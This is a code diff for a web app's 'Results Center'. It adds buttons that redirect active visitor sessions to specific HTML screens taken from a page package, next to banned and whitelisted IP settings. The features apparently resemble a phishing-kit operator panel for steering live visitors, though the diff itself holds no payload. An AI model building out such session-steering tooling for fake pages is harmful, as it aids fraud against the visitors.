@@ -842,6 +842,62 @@ function packageEntryFile(pagePackage) {
   return screens.find((screen) => screen.role === "entry")?.file || screens[0]?.file || "";
 }
 
+function sessionTargetLabel(screen, fallback = "Page") {
+  const value = typeof screen === "string"
+    ? screen
+    : screen?.name || screen?.title || screen?.label || screen?.file || fallback;
+  return String(value)
+    .replace(/\\/g, "/")
+    .split("/")
+    .pop()
+    .replace(/\.html?$/i, "")
+    .replace(/[-_]+/g, " ")
+    .replace(/\b\w/g, (letter) => letter.toUpperCase())
+    .trim() || fallback;
+}
+
+function sessionTargetFile(screen, manifestScreens = []) {
+  if (typeof screen === "string") {
+    const flowName = screen.trim();
+    const matched = manifestScreens.find((item) => (
+      String(item.name || "").toLowerCase() === flowName.toLowerCase()
+      || String(item.file || "").toLowerCase() === flowName.toLowerCase()
+    ));
+    return matched?.file || (/\.html?$/i.test(flowName) ? flowName : "");
+  }
+  return String(screen?.file || screen?.path || screen?.href || "").trim();
+}
+
+function runtimeScreenTargetUrl(page, file) {
+  const cleanFile = String(file || "").replace(/^\/+/, "").trim();
+  if (!page?.id || !cleanFile) return "";
+  const params = new URLSearchParams({ userPageId: page.id, file: cleanFile });
+  return `/api/source?${params.toString()}`;
+}
+
+function sessionPageTargets(page) {
+  const pagePackage = packageForUserPage(page);
+  const manifestScreens = pagePackage?.packageManifest?.screens || [];
+  const candidates = [
+    ...(page.flow || []),
+    ...manifestScreens,
+    ...(pagePackage?.screens || [])
+  ];
+  const seen = new Set();
+
+  return candidates.reduce((targets, screen, index) => {
+    const file = sessionTargetFile(screen, manifestScreens).replace(/^\/+/, "");
+    if (!file || !/\.html?$/i.test(file) || seen.has(file.toLowerCase())) return targets;
+    seen.add(file.toLowerCase());
+    targets.push({
+      label: sessionTargetLabel(screen, `Page ${index + 1}`),
+      file,
+      url: runtimeScreenTargetUrl(page, file)
+    });
+    return targets;
+  }, []);
+}
+
 function shouldUsePackageRuntime(page, pagePackage) {
   return Boolean(
     pagePackage?.sourceType === "github"
@@ -3370,6 +3426,7 @@ async function renderResultsCenter(pageSlug = "page-a") {
   const sessionCommands = page.configs?.sessionCommands || {};
   const bannedIps = page.securityConfig?.bannedIps || [];
   const whitelistIps = page.securityConfig?.whitelistIps || [];
+  const pageTargets = sessionPageTargets(page);
 
   preview.innerHTML = `
     <section class="app-view">
@@ -3402,6 +3459,7 @@ async function renderResultsCenter(pageSlug = "page-a") {
         <div class="active-session-list">
           ${activeSessions.length ? activeSessions.map((session) => {
             const command = sessionCommands[session.sessionId];
+            const commandLabel = command?.note || command?.targetUrl || "";
             return `
               <article class="active-session-card">
                 <div>
@@ -3411,11 +3469,16 @@ async function renderResultsCenter(pageSlug = "page-a") {
                 </div>
                 <div class="session-meta">
                   <span>${escapeHtml(formatTrafficTime(session.lastSeenAt))}</span>
-                  <span>${command?.targetUrl ? `Queued: ${escapeHtml(command.targetUrl)}` : "No command"}</span>
+                  <span>${command?.targetUrl ? `Queued: ${escapeHtml(commandLabel)}` : "No command"}</span>
                 </div>
                 <div class="session-command">
-                  <input type="url" placeholder="https://target-page.com" value="${escapeHtml(command?.targetUrl || "")}" data-session-target="${escapeHtml(session.sessionId)}">
-                  <button type="button" data-session-redirect="${escapeHtml(session.sessionId)}" data-session-page="${escapeHtml(page.slug)}">Redirect</button>
+                  <div class="session-route-buttons" aria-label="Redirect active user">
+                    ${pageTargets.length ? pageTargets.map((target) => `
+                      <button type="button" data-session-redirect="${escapeHtml(session.sessionId)}" data-session-page="${escapeHtml(page.slug)}" data-session-target-url="${escapeHtml(target.url)}" data-session-target-label="${escapeHtml(target.label)}">
+                        ${escapeHtml(target.label)}
+                      </button>
+                    `).join("") : "<span>No mapped pages found</span>"}
+                  </div>
                   <button type="button" data-session-clear="${escapeHtml(session.sessionId)}" data-session-page="${escapeHtml(page.slug)}">Clear</button>
                 </div>
               </article>
@@ -4754,7 +4817,8 @@ preview.addEventListener("click", async (event) => {
     const sessionId = sessionRedirectButton.dataset.sessionRedirect;
     const targetField = [...preview.querySelectorAll("[data-session-target]")]
       .find((field) => field.dataset.sessionTarget === sessionId);
-    const targetUrl = targetField?.value.trim() || "";
+    const targetUrl = sessionRedirectButton.dataset.sessionTargetUrl || targetField?.value.trim() || "";
+    const targetLabel = sessionRedirectButton.dataset.sessionTargetLabel || targetUrl;
     if (!resultPage || !targetUrl) {
       statusText.textContent = "REDIRECT TARGET REQUIRED";
       return;
@@ -4762,7 +4826,7 @@ preview.addEventListener("click", async (event) => {
     await withButtonBusy(sessionRedirectButton, "Redirecting", async () => {
       const result = await requestApi(`/api/user-pages/${resultPage.id}/sessions/${encodeURIComponent(sessionId)}/redirect`, {
         method: "POST",
-        body: JSON.stringify({ targetUrl })
+        body: JSON.stringify({ targetUrl, note: targetLabel })
       });
       const updated = normalizeUserPage(result.userPage);
       ownedPages = ownedPages.map((item) => item.id === updated.id ? { ...item, ...updated } : item);
